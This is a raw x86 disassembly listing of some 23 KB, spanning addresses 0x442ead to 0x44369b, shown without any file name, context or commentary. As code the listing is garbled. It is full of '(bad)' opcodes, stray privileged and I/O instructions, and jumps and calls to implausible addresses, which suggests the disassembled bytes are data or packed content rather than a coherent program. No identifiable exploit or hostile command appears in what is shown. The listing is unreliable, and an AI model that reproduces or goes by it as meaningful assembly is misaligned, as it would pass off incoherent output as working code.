  442ead:	push   es
  442eae:	mov    esi,DWORD PTR [eax]
  442eb0:	es jl  0x442e74
  442eb3:	je     0x442f30
  442eb5:	dec    edx
  442eb6:	cld    
  442eb7:	dec    dh
  442eb9:	sti    
  442eba:	cmp    esp,DWORD PTR [eax]
  442ebc:	cs ins BYTE PTR es:[edi],dx
  442ebe:	inc    esi
  442ebf:	out    dx,al
  442ec0:	mov    esi,0x32288bfb
  442ec5:	or     BYTE PTR [edi-0x5413e77],dh
  442ecb:	jns    0x442f4c
  442ecd:	cmc    
  442ece:	add    ebp,eax
  442ed0:	lock test BYTE PTR [ebp+0x59],al
  442ed4:	js     0x442f20
  442ed6:	lock sub BYTE PTR [ebx+0x13],0x41
  442edb:	hlt    
  442edc:	and    al,bh
  442ede:	pcmpeqw mm0,QWORD PTR [edx]
  442ee1:	xchg   DWORD PTR [ebp+0x3d],edx
  442ee4:	js     0x442f28
  442ee6:	or     dh,bh
  442ee8:	mov    ch,0xb
  442eea:	add    eax,DWORD PTR [eax]
  442eec:	add    BYTE PTR [eax],al
  442eee:	add    BYTE PTR [eax],al
  442ef0:	jge    0x442f69
  442ef2:	push   edx
  442ef3:	clc    
  442ef4:	out    dx,al
  442ef5:	dec    BYTE PTR [esi]
  442ef7:	add    esi,DWORD PTR [eax+0x7d4d8512]
  442efd:	ja     0x442f51
  442eff:	or     al,0x76
  442f01:	adc    DWORD PTR [ebp+0x379fd4d],eax
  442f07:	or     cl,BYTE PTR [esi]
  442f09:	pop    edx
  442f0a:	test   BYTE PTR [ebp+0x7d],dl
  442f0d:	ja     0x442f51
  442f0f:	or     BYTE PTR [esi-0x40],dh
  442f12:	add    ecx,DWORD PTR [ecx+0x6be6fa38]
  442f18:	fisub  DWORD PTR [ebx]
  442f1a:	clc    
  442f1b:	mov    ebx,eax
  442f1d:	lds    edi,FWORD PTR [esp+ecx*8-0x7c1488e0]
  442f24:	rcr    esi,1
  442f26:	test   BYTE PTR [ebp+0x6d],al
  442f29:	jns    0x442f6d
  442f2b:	in     al,0xfe
  442f2d:	mov    ch,0xe3
  442f2f:	mov    eax,DWORD PTR [eax+0x1e]
  442f32:	cld    
  442f33:	push   eax
  442f34:	popa   
  442f35:	jns    0x442f89
  442f37:	call   0x8c2bed2a
  442f3c:	std    
  442f3d:	cmp    bh,0xff
  442f40:	jne    0x442fbb
  442f42:	dec    edx
  442f43:	lock mul BYTE PTR [ebp+0x7e6a00ef]
  442f4a:	hlt    
  442f4b:	add    BYTE PTR [ebp+0x2],dh
  442f4e:	test   DWORD PTR [ebp+0x7d],edx
  442f51:	call   DWORD PTR [edx-0x10]
  442f54:	add    BYTE PTR [eax],al
  442f56:	add    BYTE PTR [eax],al
  442f58:	add    ah,ch
  442f5a:	int3   
  442f5b:	fisttp WORD PTR [ebx+0x787c22b0]
  442f61:	add    cl,BYTE PTR gs:[ecx]
  442f64:	test   BYTE PTR [eax+0x2],dl
  442f67:	add    BYTE PTR [eax],al
  442f69:	iret   
  442f6a:	add    ah,BYTE PTR [esi+0x0]
  442f6d:	out    dx,al
  442f6e:	mov    ah,0xdf
  442f70:	mov    ecx,eax
  442f72:	cli    
  442f73:	cld    
  442f74:	push   eax
  442f75:	jns    0x442f47
  442f77:	clc    
  442f78:	adc    eax,0x3c2aad
  442f7d:	in     al,dx
  442f7e:	mov    esp,0x22b88bfb
  442f83:	jl     0x442fbd
  442f85:	jne    0x442f35
  442f87:	push   ss
  442f88:	mov    esi,DWORD PTR [eax+0x6d558422]
  442f8e:	dec    DWORD PTR [esi]
  442f90:	mov    DWORD PTR [eax+0x2e],ecx
  442f93:	test   BYTE PTR [ebp-0x2b],al
  442f96:	jbe    0x442fe2
  442f98:	or     BYTE PTR [esi-0x46],dh
  442f9b:	jns    0x182845c9
  442fa1:	dec    ah
  442fa3:	fisttp WORD PTR [ebx+0x41fcfa30]
  442fa9:	gs jns 0x442fee
  442fac:	hlt    
  442fad:	out    dx,al
  442fae:	mov    ah,0xdf
  442fb0:	mov    ecx,DWORD PTR [eax-0x6]
  442fb3:	cld    
  442fb4:	adc    ah,bh
  442fb6:	int3   
  442fb7:	jmp    0x442f80
  442fb9:	cmp    BYTE PTR [edx],ch
  442fbb:	(bad)  
  442fbc:	inc    DWORD PTR [eax]
  442fbe:	add    BYTE PTR [eax],al
  442fc0:	add    BYTE PTR [eax],al
  442fc2:	jne    0x442fc6
  442fc4:	test   DWORD PTR [ebp-0x6b],eax
  442fc7:	jle    0x443040
  442fc9:	adc    BYTE PTR [ebp-0x52],dh
  442fcc:	or     BYTE PTR [ebx+0x397c2230],cl
  442fd2:	jne    0x442f82
  442fd4:	add    bh,al
  442fd6:	mov    eax,0x75fffe1a
  442fdb:	add    al,BYTE PTR [ebp+0x35866955]
  442fe1:	add    cl,ah
  442fe3:	mov    ds:0x8e494584,eax
  442fe8:	pop    es
  442fe9:	adc    DWORD PTR [ebx+eax*1+0x0],0x1b96f500
  442ff1:	mov    esp,DWORD PTR [eax+0x58028416]
  442ff7:	and    eax,edi
  442ff9:	jmp    FWORD PTR [edx+0x214d84b2]
  442fff:	mov    ah,0xe7
  443001:	mov    ch,0x18
  443003:	and    bh,al
  443005:	cmp    DWORD PTR [ecx],0xb
  443008:	xchg   DWORD PTR [ebp+0x29],eax
  44300b:	sbb    ecx,DWORD PTR cs:[ebx+0x28416a8]
  443012:	out    dx,al
  443013:	iret   
  443014:	pop    es
  443015:	lea    ecx,[ecx+0xa]
  443018:	(bad)  
  443019:	push   ecx
  44301a:	inc    bh
  44301c:	sti    
  44301d:	push   eax
  44301e:	int    0x79
  443020:	cli    
  443021:	(bad)  
  443022:	fiadd  DWORD PTR [ebp+0x8c3]
  443028:	add    BYTE PTR [eax],al
  44302a:	add    ah,bh
  44302c:	(bad)  
  44302d:	fisttp DWORD PTR [ebx+0x55842e38]
  443033:	mov    eax,ds:0x308b0e8b
  443038:	push   ss
  443039:	jl     0x442ffb
  44303b:	jns    0x442fc8
  44303d:	inc    edx
  44303e:	hlt    
  44303f:	dec    bh
  443041:	jmp    0x442fc6
  443043:	mov    ah,0x6
  443045:	xchg   DWORD PTR [ebp-0x77],ecx
  443048:	sub    eax,0x22288b90
  44304d:	jl     0x443011
  44304f:	popa   
  443050:	mov    edx,DWORD PTR [edx-0x20]
  443053:	mov    WORD PTR [eax],ss
  443055:	stc    
  443056:	(bad)  
  443057:	jp     0x442fe6
  443059:	loop   0x4430b8
  44305b:	ss dec esi
  44305d:	retf   
  44305e:	int3   
  44305f:	ror    BYTE PTR [ebp+0xa5183eb],0x68
  443066:	lock jbe 0x44302b
  443069:	(bad)  
  44306a:	(bad)  
  44306b:	push   0x7543f7b2
  443070:	mov    eax,DWORD PTR [edx-0x8]
  443073:	int    0x1e
  443075:	cld    
  443076:	aas    
  443077:	jne    0x443006
  443079:	inc    edx
  44307a:	clc    
  44307b:	lds    ebp,FWORD PTR [edx]
  44307d:	cmp    ebp,edi
  44307f:	sub    ah,BYTE PTR [ecx]
  443081:	jl     0x443047
  443083:	ins    DWORD PTR es:[edi],dx
  443084:	mov    eax,DWORD PTR [edx-0x4]
  443087:	out    dx,al
  443088:	into   
  443089:	sqrtps xmm7,xmm6
  44308c:	mov    dh,0xb
  44308e:	push   edx
  44308f:	add    BYTE PTR [eax],al
  443091:	add    BYTE PTR [eax],al
  443093:	add    dh,bh
  443095:	mov    BYTE PTR [edi],0x50
  443098:	add    dh,BYTE PTR [edi-0x40ef7405]
  44309e:	mov    esp,0xcb4dc1cc
  4430a3:	int3   
  4430a4:	inc    eax
  4430a5:	(bad)  
  4430a6:	jmp    0x443049
  4430a8:	adc    DWORD PTR [edx],ebx
  4430aa:	cmp    al,0x0
  4430ac:	mov    bl,0x1
  4430ae:	push   0xf766688b
  4430b3:	inc    ebx
  4430b4:	jne    0x443041
  4430b6:	dec    edi
  4430b7:	add    DWORD PTR [edi],eax
  4430b9:	inc    ebp
  4430ba:	xchg   DWORD PTR [eax+0x70],edx
  4430bd:	mov    edi,0x4dc1ccbc
  4430c2:	retf   
  4430c3:	int3   
  4430c4:	inc    eax
  4430c5:	(bad)  
  4430c6:	jmp    0x44304b
  4430c8:	xchg   ecx,eax
  4430c9:	or     eax,0xc49da09f
  4430ce:	dec    DWORD PTR [edx+0x3ec6d4a7]
  4430d4:	inc    cl
  4430d6:	das    
  4430d7:	mov    esp,DWORD PTR [edi-0x11c13274]
  4430dd:	leave  
  4430de:	or     ecx,DWORD PTR [ebx-0xbb575b9]
  4430e4:	inc    ch
  4430e6:	repz mov ebp,DWORD PTR [ebp+0x5d4d870e]
  4430ed:	mov    WORD PTR [edx-0x8],ss
  4430f0:	cld    
  4430f1:	mov    ch,0xfb
  4430f3:	mov    eax,0x274
  4430f8:	add    BYTE PTR [eax],al
  4430fa:	add    BYTE PTR [eax],al
  4430fc:	add    al,bh
  4430fe:	inc    edx
  4430ff:	jae    0x443145
  443101:	neg    BYTE PTR [ebp+0x6a800f7]
  443107:	sub    eax,0x84df1ec0
  44310c:	dec    ebp
  44310d:	sbb    eax,0x5e184e8c
  443112:	mov    ch,0x7
  443114:	jne    0x443182
  443116:	mov    eax,DWORD PTR [edx-0x8]
  443119:	dec    ch
  44311b:	or     ecx,DWORD PTR [ecx+0x5584fead]
  443121:	std    
  443122:	mov    eax,DWORD PTR [edx+0x10]
  443125:	cld    
  443126:	les    edx,FWORD PTR [edi]
  443128:	mov    eax,0x274
  44312d:	into   
  44312e:	cli    
  44312f:	test   BYTE PTR [ebp-0x23],cl
  443132:	mov    ecx,DWORD PTR [esi]
  443134:	mov    DWORD PTR [eax],ebp
  443136:	sbb    al,BYTE PTR [ebp+eax*2-0x3bd2433]
  44313d:	dec    eax
  44313e:	push   es
  44313f:	sub    eax,0xe506cec0
  443144:	mov    bl,0x66
  443146:	inc    edx
  443147:	test   ch,ah
  443149:	dec    eax
  44314a:	inc    ebx
  44314b:	retf   
  44314c:	int3   
  44314d:	mov    cl,0x4e
  44314f:	retf   
  443150:	int3   
  443151:	test   eax,0xc1cccb4e
  443156:	dec    esi
  443157:	retf   
  443158:	int3   
  443159:	and    BYTE PTR [ebx-0x56e7c15],cl
  44315f:	rol    BYTE PTR [ebp+0x0],0x0
  443163:	add    BYTE PTR [eax],al
  443165:	add    BYTE PTR [ebp+0x2],bh
  443168:	xor    BYTE PTR [eax],al
  44316a:	jne    0x443116
  44316c:	add    eax,DWORD PTR [esi*4+0x5d8c9f02]
  443173:	ret    
  443174:	dec    DWORD PTR [edi+0x4d]
  443177:	mov    bl,0xfb
  443179:	call   DWORD PTR [edx-0x7d]
  44317c:	ret    
  44317d:	or     ah,bh
  44317f:	(bad)  
  443180:	repz push 0xffffffb5
  443183:	mov    ecx,DWORD PTR [edx-0x8]
  443186:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443187:	mov    edx,DWORD PTR [edx]
  443189:	ins    BYTE PTR es:[edi],dx
  44318a:	sub    eax,0xb78affc3
  44318f:	mov    dl,0x4f
  443191:	push   0x75
  443193:	pop    ds
  443194:	push   edx
  443195:	hlt    
  443196:	(bad)  
  443197:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443198:	test   DWORD PTR [ebx+0x75],0xd643a83
  44319f:	ret    
  4431a0:	(bad)  
  4431a1:	dec    DWORD PTR [eax+0x7502b807]
  4431a7:	add    al,BYTE PTR [eax]
  4431a9:	jmp    0x44320a
  4431ab:	mov    ecx,DWORD PTR [edx]
  4431ad:	add    BYTE PTR [esi-0x3e],dh
  4431b0:	dec    DWORD PTR [eax+0x671230]
  4431b6:	jecxz  0x4431ba
  4431b8:	add    BYTE PTR [eax+0x75],ch
  4431bb:	add    eax,DWORD PTR [eax+0x0]
  4431be:	(bad)  
  4431bf:	hlt    
  4431c0:	arpl   ax,di
  4431c2:	add    bh,BYTE PTR ss:[edi-0x3e]
  4431c6:	jne    0x4431cb
  4431c8:	add    BYTE PTR [eax],al
  4431ca:	add    BYTE PTR [eax],al
  4431cc:	add    BYTE PTR [eax],al
  4431ce:	add    BYTE PTR [edi+0x2a],al
  4431d1:	cdq    
  4431d2:	(bad)  
  4431d3:	stos   BYTE PTR es:[edi],al
  4431d4:	push   ds
  4431d5:	jl     0x44319b
  4431d7:	jno    0x443233
  4431d9:	inc    DWORD PTR [edx]
  4431db:	xor    eax,0x76002b02
  4431e0:	add    al,BYTE PTR [eax]
  4431e2:	mov    edi,DWORD PTR [eax-0x5a]
  4431e5:	test   DWORD PTR [ebx+0x75],0x6889c7eb
  4431ec:	jbe    0x4431e5
  4431ee:	inc    ebx
  4431ef:	jne    0x44317a
  4431f1:	adc    dl,BYTE PTR [ebp+ebp*2+0x1451ffc2]
  4431f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4431f9:	test   DWORD PTR [ebx+0x75],0x454d84b2
  443200:	mov    ah,0xe7
  443202:	popf   
  443203:	dec    ecx
  443204:	push   ds
  443205:	clc    
  443206:	cmp    DWORD PTR [ecx],0xf
  443209:	test   DWORD PTR ds:0x3c1ad1,edx
  44320f:	jbe    0x4431c8
  443211:	pop    es
  443212:	mov    eax,eax
  443214:	sub    al,BYTE PTR [ebp+edx*2-0x7422e1f3]
  44321b:	adc    al,al
  44321d:	mov    esp,0xcb4f41cc
  443222:	int3   
  443223:	mov    al,ds:0xb88beb89
  443228:	or     dh,BYTE PTR ds:0x916945
  44322e:	mov    edi,DWORD PTR [eax]
  443230:	or     ah,ch
  443232:	add    eax,0x0
  443237:	add    dh,bl
  443239:	add    DWORD PTR [ebp-0x43408ebb],eax
  44323f:	int3   
  443240:	test   eax,0xc1cccb4e
  443245:	dec    esi
  443246:	retf   
  443247:	int3   
  443248:	and    BYTE PTR [ecx-0x112e7c15],cl
  44324e:	rol    BYTE PTR [ebp-0x47],0x2
  443252:	and    BYTE PTR [esi*2-0x3f7bd77],al
  443259:	(bad)  
  44325a:	xlat   BYTE PTR ds:[ebx]
  44325b:	mov    esi,DWORD PTR [eax]
  44325d:	cmp    al,BYTE PTR [ebp+edx*2+0x3c4f016d]
  443264:	cld    
  443265:	mov    bh,0xdf
  443267:	mov    esi,DWORD PTR [eax]
  443269:	and    cl,BYTE PTR [eax]
  44326b:	mov    bh,0x2d
  44326d:	test   BYTE PTR [ebp+edx*2+0xa438f95],0x8d
  443275:	mov    eax,DWORD PTR [edx-0x18]
  443278:	(bad)  
  44327a:	add    eax,DWORD PTR [eax+0x75]
  44327d:	mov    DWORD PTR [edx],ecx
  44327f:	mov    WORD PTR [ebp-0x3f],ds
  443282:	call   DWORD PTR [eax+0x5d]
  443285:	int    0xf4
  443287:	dec    DWORD PTR [edx-0x7f]
  44328a:	ret    
  44328b:	or     ah,ch
  44328d:	(bad)  
  44328e:	out    dx,eax
  44328f:	push   0xffffffb5
  443291:	stos   BYTE PTR es:[edi],al
  443292:	jmp    FWORD PTR [edi]
  443294:	jne    0x443298
  443296:	push   0x65500
  44329b:	push   0x0
  44329d:	add    BYTE PTR [eax],al
  44329f:	add    BYTE PTR [eax],al
  4432a1:	jne    0x4432c0
  4432a3:	push   edx
  4432a4:	lock in al,dx
  4432a6:	(bad)  
  4432a7:	jecxz  0x443234
  4432a9:	test   al,0x22
  4432ab:	test   BYTE PTR [edx-0x5f],al
  4432ae:	mov    dl,0x84
  4432b0:	dec    ebp
  4432b1:	ins    DWORD PTR es:[edi],dx
  4432b2:	mov    bl,0x84
  4432b4:	push   ebp
  4432b5:	adc    DWORD PTR [eax+0x1cf0c1e7],esi
  4432bb:	clc    
  4432bc:	xor    DWORD PTR [ecx-0x16ba3ef3],0x1
  4432c3:	add    BYTE PTR [eax],al
  4432c5:	jne    0x4432f0
  4432c7:	push   es
  4432c8:	mov    edi,DWORD PTR [eax]
  4432ca:	push   ss
  4432cb:	jl     0x44328d
  4432cd:	je     0x44325a
  4432cf:	inc    edx
  4432d0:	hlt    
  4432d1:	out    dx,al
  4432d2:	into   
  4432d3:	fisttp WORD PTR [edi]
  4432d5:	add    dh,BYTE PTR [ebx+0x16483901]
  4432db:	ins    BYTE PTR es:[edi],dx
  4432dc:	pop    ecx
  4432dd:	inc    dh
  4432df:	out    0x83,eax
  4432e1:	sbb    eax,0x3073fff6
  4432e6:	mov    DWORD PTR [edx-0x18],ecx
  4432e9:	neg    BYTE PTR [edx-0x21fefff1]
  4432ef:	test   BYTE PTR [ebp-0x73],dl
  4432f2:	mov    BYTE PTR ds:0xdfceee10,bh
  4432f8:	mov    eax,esp
  4432fa:	fimul  WORD PTR [edx-0x7be47abc]
  443300:	dec    ebp
  443301:	push   ebp
  443302:	ror    ch,1
  443304:	test   DWORD PTR [eax],0x0
  44330a:	in     al,0xde
  44330c:	test   BYTE PTR [ebp+0x55],dl
  44330f:	or     al,0xa9
  443311:	inc    edx
  443312:	mov    DWORD PTR [edx-0x77b2ba7c],esi
  443318:	dec    edx
  443319:	or     BYTE PTR [esi-0x36],dh
  44331c:	adc    edx,DWORD PTR [ecx-0x2]
  44331f:	mov    ch,0xe7
  443321:	mov    esi,DWORD PTR [eax+0x7141fc26]
  443327:	mov    dl,0xe7
  443329:	push   ebp
  44332a:	sbb    BYTE PTR [eax+edi*8],bl
  44332d:	cmp    DWORD PTR [ecx],0xf
  443330:	test   DWORD PTR [ebp+0x1d],ecx
  443333:	cmp    BYTE PTR [esi-0x183213d8],0xeb
  44333a:	out    0x87,eax
  44333c:	push   edx
  44333d:	in     al,0x47
  44333f:	sub    cl,BYTE PTR [ecx]
  443341:	cld    
  443342:	jmp    0x23aa:0x79c47c1b
  443349:	add    al,0x35
  44334b:	add    bl,BYTE PTR [edi-0x403274]
  443351:	dec    edi
  443352:	fld    QWORD PTR [edi+0x7fc2fff5]
  443358:	ret    
  443359:	or     ah,ch
  44335b:	(bad)
  44335e:	jo     0x4432ea
  443360:	test   DWORD PTR [ebx+0x75],0xee0a7302
  443367:	or     eax,0x236f880
  44336c:	dec    edi
  44336d:	inc    DWORD PTR [eax]
  44336f:	add    BYTE PTR [eax],al
  443371:	add    BYTE PTR [eax],al
  443373:	sub    BYTE PTR [esi],bh
  443375:	jl     0x4433b4
  443377:	std    
  443378:	sbb    bh,BYTE PTR [eax+eax*1]
  44337b:	jne    0x443312
  44337d:	sbb    ebp,DWORD PTR [edx+0x35]
  443380:	stos   BYTE PTR es:[edi],al
  443381:	jmp    FWORD PTR [edi]
  443383:	jne    0x443387
  443385:	test   DWORD PTR [ebp+0x69],edx
  443388:	mov    al,0x84
  44338a:	inc    ebp
  44338b:	push   ebp
  44338c:	xchg   DWORD PTR [edi+0x34],eax
  44338f:	les    ebx,FWORD PTR [ebx]
  443391:	push   edx
  443392:	lock push ss
  443394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443395:	test   DWORD PTR [ebx+0x75],0xb56a1227
  44339c:	stos   BYTE PTR es:[edi],al
  44339d:	jmp    FWORD PTR [edi]
  44339f:	jne    0x4433a3
  4433a1:	test   DWORD PTR [ebp+0x31],edx
  4433a4:	mov    al,0x65
  4433a6:	add    BYTE PTR [edx],ch
  4433a8:	mov    ch,0xef
  4433aa:	mov    ds:0x3c1a99,eax
  4433af:	neg    ah
  4433b1:	arpl   ax,di
  4433b3:	mov    dh,0x2
  4433b5:	add    BYTE PTR [ebp+0x60],dh
  4433b8:	test   al,0x3f
  4433ba:	push   0xffffd275
  4433bf:	out    dx,al
  4433c0:	(bad)  
  4433c1:	sti    
  4433c2:	push   eax
  4433c3:	pop    edi
  4433c4:	add    bh,cl
  4433c6:	push   ebp
  4433c7:	in     eax,0x5e
  4433c9:	arpl   ax,di
  4433cb:	add    al,BYTE PTR ss:[ebp+0x4a88d14d]
  4433d2:	fdivr  st,st(6)
  4433d4:	mov    ah,0xd7
  4433d6:	mov    eax,DWORD PTR [eax]
  4433d8:	add    BYTE PTR [eax],al
  4433da:	add    BYTE PTR [eax],al
  4433dc:	xor    BYTE PTR [edx],bh
  4433de:	cld    
  4433df:	inc    ecx
  4433e0:	or     DWORD PTR [ecx-0x33111fbe],0xb2448bdf
  4433ea:	dec    ebp
  4433eb:	mov    esi,DWORD PTR [eax]
  4433ed:	es dec edi
  4433ef:	mov    esi,DWORD PTR [eax-0x5a]
  4433f2:	test   DWORD PTR [ebx+0x75],0x9191e7b1
  4433f9:	sbb    bh,al
  4433fb:	xor    DWORD PTR [ecx-0x6aaa7af3],0x7e
  443402:	mov    ch,0xa4
  443404:	jne    0x443408
  443406:	add    BYTE PTR [eax],al
  443408:	jmp    0x5589b8e8
  44340d:	mov    cs,WORD PTR [edx-0x28]
  443410:	jbe    0x44339c
  443412:	lahf   
  443413:	add    BYTE PTR [ebp+0x2],dh
  443416:	xchg   DWORD PTR [ebp+0x61],ecx
  443419:	mov    ss,WORD PTR [edx-0x20]
  44341c:	adc    al,0x9f
  44341e:	test   DWORD PTR [ebx+0x75],0x16343ded
  443425:	outs   dx,DWORD PTR ds:[esi]
  443426:	test   DWORD PTR [ebx+0x75],0x2d940a8d
  44342d:	(bad)  
  44342e:	call   DWORD PTR [eax-0x12]
  443431:	out    dx,eax
  443432:	arpl   ax,di
  443434:	mov    dh,0x2
  443436:	dec    esi
  443437:	mov    edi,DWORD PTR [eax-0x7617b0da]
  44343d:	sbb    al,0xf8
  44343f:	inc    DWORD PTR [eax]
  443441:	add    BYTE PTR [eax],al
  443443:	add    BYTE PTR [eax],al
  443445:	idiv   BYTE PTR [esi]
  443447:	or     ecx,DWORD PTR [ebx+0x158422a8]
  44344d:	pop    ecx
  44344e:	sbb    bh,BYTE PTR [eax+eax*1]
  443451:	jbe    0x443406
  443453:	daa    
  443454:	mov    DWORD PTR [eax+0x7543f75e],ecx
  44345a:	test   DWORD PTR [edx],edi
  44345c:	mov    ch,cl
  44345e:	(bad)  
  443461:	inc    eax
  443462:	out    0x9e,al
  443464:	fs mov ebp,0xee4fffc5
  44346a:	pop    es
  44346b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44346c:	clc    
  44346d:	add    cl,BYTE PTR ss:[edi-0x75]
  443471:	add    BYTE PTR [edx-0x4b8abc09],0xe7
  443478:	jne    0x443413
  44347a:	sbb    eax,edi
  44347c:	cmp    DWORD PTR [ecx-0x729b60fa],0xffffffc5
  443483:	dec    DWORD PTR [edi-0x73]
  443486:	shl    esi,0xff
  443489:	jp     0x443410
  44348b:	ret    
  44348c:	add    al,0x5e
  44348e:	mov    ds:0xc2713467,al
  443493:	dec    DWORD PTR [edx+0x43f78670]
  443499:	jne    0x44344e
  44349b:	out    0x51,eax
  44349d:	dec    esp
  44349e:	sbb    eax,edi
  4434a0:	xor    DWORD PTR [ecx],0xa
  4434a3:	xchg   DWORD PTR [ebp+0x29],eax
  4434a6:	lea    edx,[edx]
  4434a8:	add    BYTE PTR fs:[eax],al
  4434ab:	add    BYTE PTR [eax],al
  4434ad:	add    BYTE PTR ds:0xfe51ffc5,bh
  4434b3:	mov    esi,0x9e788bdf
  4434b8:	test   DWORD PTR [ebx+0x75],0xc4284805
  4434bf:	lea    edx,[edx]
  4434c1:	or     BYTE PTR ds:0x1d51ffc5,0xed
  4434c8:	sti    
  4434c9:	inc    DWORD PTR [edx]
  4434cb:	test   ebx,eax
  4434cd:	or     al,0xd4
  4434cf:	xor    edi,0xdfff7543
  4434d5:	cmc    
  4434d6:	jbe    0x4434da
  4434d8:	popf   
  4434d9:	lods   al,BYTE PTR ds:[esi]
  4434da:	ffree  st(4)
  4434dc:	dec    DWORD PTR [eax+ebp*1+0x356a4e1a]
  4434e3:	lods   al,BYTE PTR ds:[esi]
  4434e4:	add    DWORD PTR [ebx+0x43f76660],ecx
  4434ea:	jne    0x4434a0
  4434ec:	clc    
  4434ed:	push   ebp
  4434ee:	mov    eax,ds:0xb2fbdd29
  4434f3:	sbb    BYTE PTR [edi+0x27501],dh
  4434f9:	mov    ebx,DWORD PTR [eax+0x7504bdb6]
  4434ff:	inc    esi
  443500:	retf   
  443501:	int3   
  443502:	rol    DWORD PTR [ebp-0x35],0xcc
  443506:	and    BYTE PTR [ebp+0xa388beb],cl
  44350c:	test   DWORD PTR [eax+0x79],eax
  44350f:	mov    dh,0xbc
  443511:	int3   
  443512:	add    BYTE PTR [eax],al
  443514:	add    BYTE PTR [eax],al
  443516:	add    BYTE PTR [ecx+0x47],al
  443519:	retf   
  44351a:	int3   
  44351b:	ror    BYTE PTR [ebx-0x5034ac15],0x84
  443522:	cmp    eax,0x3c1ae5
  443527:	(bad)  
  443528:	cmc    
  443529:	jnp    0x443523
  44352b:	mov    dh,0x2
  44352d:	test   DWORD PTR ds:0x3c1acd,esi
  443533:	call   0xcb47:0x365d54b8
  44353a:	int3   
  44353b:	ror    BYTE PTR [ebx-0x4172ae15],0x3
  443542:	inc    eax
  443543:	jne    0x4435a6
  443545:	mov    edi,eax
  443547:	mov    dh,0x2
  443549:	push   eax
  44354a:	call   0x3c5028
  44354f:	idiv   BYTE PTR [esi]
  443551:	pop    es
  443552:	mov    DWORD PTR [eax+0x7d4d8416],esi
  443558:	mov    cl,0x65
  44355a:	add    dh,bh
  44355c:	in     eax,dx
  44355d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44355e:	clc    
  44355f:	add    cl,BYTE PTR ss:[esi-0x1]
  443563:	inc    eax
  443564:	push   ss
  443565:	test   ch,ah
  443567:	xor    BYTE PTR [ebx-0x35],al
  44356a:	int3   
  44356b:	and    BYTE PTR [ebx-0x212e7c15],cl
  443571:	rol    BYTE PTR [ebp-0x43],0x2
  443575:	add    BYTE PTR [eax],al
  443577:	jne    0x4435b8
  443579:	inc    edx
  44357a:	fadd   QWORD PTR [eax]
  44357c:	add    BYTE PTR [eax],al
  44357e:	add    BYTE PTR [eax],al
  443580:	sub    eax,0xba000002
  443585:	mov    ebp,0x27501f3
  44358a:	add    bh,al
  44358c:	cmp    BYTE PTR [esi],dl
  44358e:	(bad)  
  44358f:	push   DWORD PTR [ebp+0x2]
  443592:	rol    DWORD PTR [ebp-0x67],0x2
  443596:	add    BYTE PTR [eax],al
  443598:	jne    0x443525
  44359a:	dec    edx
  44359b:	or     ah,bh
  44359d:	add    al,0x80
  44359f:	clc    
  4435a0:	mov    dh,0x2
  4435a2:	call   0xf85ba050
  4435a7:	mov    eax,ds:0x3c19f5
  4435ac:	cwde   
  4435ad:	pop    ss
  4435ae:	clc    
  4435af:	add    BYTE PTR [ebp-0x72],dh
  4435b2:	or     eax,edi
  4435b4:	js     0x443540
  4435b6:	test   DWORD PTR [ebx+0x75],0x75000002
  4435bd:	sub    eax,DWORD PTR ds:0xf78a70c7
  4435c3:	inc    ebx
  4435c4:	jne    0x4435c7
  4435c6:	add    BYTE PTR [eax],al
  4435c8:	jne    0x44354d
  4435ca:	cmp    al,BYTE PTR [eax-0x3cf3]
  4435d0:	or     BYTE PTR [ecx+eax*8],0x5
  4435d4:	in     eax,dx
  4435d5:	sbb    DWORD PTR [eax+eax*1],edi
  4435d8:	jne    0x4435dc
  4435da:	add    BYTE PTR [eax],al
  4435dc:	not    ah
  4435de:	xchg   eax,edi
  4435e0:	add    al,BYTE PTR ss:[eax]
  4435e3:	jne    0x4435e5
  4435e5:	add    BYTE PTR [eax],al
  4435e7:	add    BYTE PTR [eax],al
  4435e9:	jo     0x443597
  4435eb:	(bad)  
  4435ec:	inc    BYTE PTR [eax+0x7543f7b2]
  4435f2:	arpl   WORD PTR [edi-0x8],di
  4435f5:	add    al,BYTE PTR ss:[ebp+0x3c19f50d]
  4435fc:	add    ah,ch
  4435fe:	(bad)  
  4435ff:	out    0x8b,eax
  443601:	mov    BYTE PTR [edx-0x748abc09],al
  443607:	inc    edx
  443608:	call   0x897ffa83
  44360d:	xor    BYTE PTR [edx],ch
  44360f:	test   BYTE PTR [ebp-0x63],cl
  443612:	mov    BYTE PTR [edx],cl
  443614:	ins    BYTE PTR es:[edi],dx
  443615:	(bad)  
  443616:	ret    0x67ff
  443619:	and    eax,0x7a003ffe
  44361e:	in     al,dx
  44361f:	dec    edi
  443620:	clc    
  443621:	mov    dh,0x2
  443623:	popf   
  443624:	mov    WORD PTR [ebp-0x3e],gs
  443627:	inc    esi
  443629:	js     0x4436a1
  44362b:	test   DWORD PTR [ebx+0x75],0x7540038f
  443632:	stos   BYTE PTR es:[edi],al
  443633:	pop    edi
  443634:	add    al,0xb5
  443636:	add    al,BYTE PTR [ebp+0x3c1af115]
  44363c:	add    BYTE PTR [edi+0x32f7bd2a],ah
  443642:	push   ss
  443643:	jl     0x443609
  443645:	jge    0x4436a8
  443647:	xchg   edi,eax
  443648:	clc    
  443649:	mov    dh,0x2
  44364b:	stc    
  44364c:	adc    eax,0x0
  443651:	add    ch,bh
  443653:	sbb    bh,BYTE PTR [eax+eax*1]
  443656:	(bad)  
  443657:	push   0xfffffff7
  443659:	inc    ebx
  44365a:	jne    0x4436bf
  44365c:	fwait
  44365d:	clc    
  44365e:	mov    dh,0x2
  443660:	push   eax
  443661:	call   0x3c4b27
  443666:	idiv   BYTE PTR [esi]
  443668:	add    ecx,DWORD PTR [ecx+0x4d841230]
  44366e:	in     eax,0xb3
  443670:	out    0xd5,eax
  443672:	fist   DWORD PTR ds:0xfeb983f8
  443678:	pushf  
  443679:	test   ch,cl
  44367b:	sar    edi,0x8a
  44367e:	sub    BYTE PTR [edx],dl
  443680:	dec    ebp
  443681:	push   0x75
  443683:	arpl   WORD PTR [ebx+0x500236f8],ax
  443689:	call   0x3c4497
  44368e:	idiv   BYTE PTR [esi]
  443690:	or     ecx,DWORD PTR [ebx+0x4d861228]
  443696:	xchg   ebp,eax
  443697:	mov    DWORD PTR [edx-0x4],edx
  44369a:	dec    esi
  44369b:	scas   eax,DWORD PTR es:[edi]
